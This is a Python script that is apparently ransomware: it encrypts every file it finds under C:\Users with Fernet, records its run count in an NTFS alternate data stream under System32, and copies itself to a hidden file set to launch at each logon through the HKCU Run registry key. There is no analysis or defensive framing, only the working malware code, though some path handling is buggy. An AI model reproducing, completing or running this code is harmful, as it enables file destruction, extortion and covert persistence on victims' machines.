#!/usr/bin/env python3
import os
import shutil
import winreg
import time
import tempfile
from cryptography.fernet import Fernet
import subprocess
import signal
from termcolor import colored
import allfiles1
import sys
# import cv2
import ctypes


# Crl C
def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", "red"))
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


# Create a file txt in C:\Windows\System32
def create_file_in_system32(filename, content):
    system32_dir = r"C:\Windows\System32"
    file_path = os.path.join(system32_dir, filename)
    try:
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(content)
        print(colored(f"\n[*] File created in system32", "green"))
    except PermissionError:
        print(colored(f"\n[!] Permission Error", "red"))
    except Exception as e:
        print(colored(f"\n[!] Error: {e}", "red"))

# Read ADS
def read_executions_from_ads(file_path):
    ads_path = f"{file_path}:executions"
    try:
        with open(ads_path, "r") as f:
            executions_r = int(f.read().strip())
            print(colored(f"\n[*] Executions: {executions_r}", "green"))
            return executions_r
    except FileNotFoundError:
        print(colored(f"\n[!] Error on reading ADS", "red"))
        return 0
    except Exception as e:
        print(colored(f"\n[!] Error: {e}", "red"))

# Write ADS
def write_executions_to_ads(file_path, value):
    ads_path = f"{file_path}:executions"
    try:
        with open(ads_path, "w") as f:
            f.write(str(value))
        print(colored(f"\n[*] Ads success", "green"))
    except FileNotFoundError:
        print(colored(f"\n[!] Error: File not found"))
    except Exception as e:
        print(colored(f"\n[!] Error: {e}", "red"))

# Persistence modifying SO registry to start the file on logon
def on_logon_registry(c_dir, file_e, dest_dir):
    try:
        if file_e not in dest_dir:
            shutil.copy2(file_e, dest_dir)
            time.sleep(4)
        if file_e in c_dir:
            c_dir.remove(file_e)
        new_filepath = os.path.join(dest_dir, file_e).decode()
        ctypes.windll.kernel32.SetFileAttributesW(new_filepath, 2)
        regpath = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        reghive = winreg.HKEY_CURRENT_USER
        reg = winreg.ConnectRegistry(None, reghive)
        key_reg = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
        winreg.SetValueEx(key_reg, "Scan", 0, winreg.REG_SZ, new_filepath)
        print(colored(f"\n[!] Persistent success", "green"))
    except Exception as e:
        print(colored(f"\n[!] Error: {e}", "red"))


def tmp_task():
    # os.system(f'schtasks /create /tn "MyTask" /tr "python {script_path}" /sc onstart')
    if "executed_twice" not in os.environ:
        print("Creando archivo temporal para la segunda ejecución...")

        # Crear archivo temporal en la carpeta del sistema
        temp_dir = tempfile.gettempdir()
        temp_script_path = os.path.join(temp_dir, "temp_script.py")
        a_dir = os.getcwd()
        dir_comp = os.path.join(a_dir, "art")
        print(colored(f"\n[!] {dir_comp}"))
        # Escribir un nuevo script Python en el archivo temporal
        with open(temp_script_path, 'w', encoding='utf-8') as temp_script:
            temp_script.write(
                "import subprocess\n"
                "import os\n\n"
                "# Código que se ejecutará desde el archivo temporal\n"
                "print('Ejecutando desde el archivo temporal.')\n\n"
                "# Ejecutar nuevamente el script original\n"
                f"subprocess.run([{dir_comp}])\n"
            )

        print(f"Archivo temporal creado: {temp_script_path}")

        # Establecer una variable de entorno para evitar bucles infinitos
        os.environ["executed_twice"] = "1"

        # Ejecutar el script desde el archivo temporal
        subprocess.run([sys.executable, temp_script_path])
        print("[!] Second execution ...")


    else:
        print("Segunda ejecución completada desde el archivo temporal.")




def gen_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


def return_key():
    return open('key.key', 'rb').read()


def file_encrypt(files, key):
    fernet = Fernet(key)
    try:
        for filepath in files:
            with open(filepath, "rb") as file:
                data_to_encrypt = file.read()
            data = fernet.encrypt(data_to_encrypt)

            with open(filepath, "wb") as file:
                file.write(data)
    except Exception as e:
        pass


def main():
    # create file in system32 -> ADS
    file_ads_name = "windows.txt"
    content = "Scan Report"
    create_file_in_system32(file_ads_name, content)
    # path ADS
    file_path_ads = r"C:\Windows\System32"
    path_ads = file_path_ads + file_ads_name
    executions = read_executions_from_ads(path_ads)
    print(colored(f"[*] Executions -> {executions}", "green"))
    # Persistence creation if executions != 2
    current_dir = os.path.dirname(os.path.abspath(__file__))
    py_e = os.path.abspath(__file__)
    # Search files from a base diretory
    base_directory = r"C:\Users"
    allfiles1.searching_files(base_directory)
    files = allfiles1.file_list
    if int(executions) != 2:
        # Let's encrypt all the files
        keycode = Fernet.generate_key()
        gen_key()
        key = return_key()
        file_encrypt(files, key)
        time.sleep(5)
        subprocess.run(["interface"])
        # Set number of executions to not encrypt more times the files
        executions_n = 2
        write_executions_to_ads(path_ads, executions_n)
        time.sleep(6)
        # Create a persistence
        on_logon_registry(current_dir, py_e, file_path_ads)

if __name__ == '__main__':
    main()





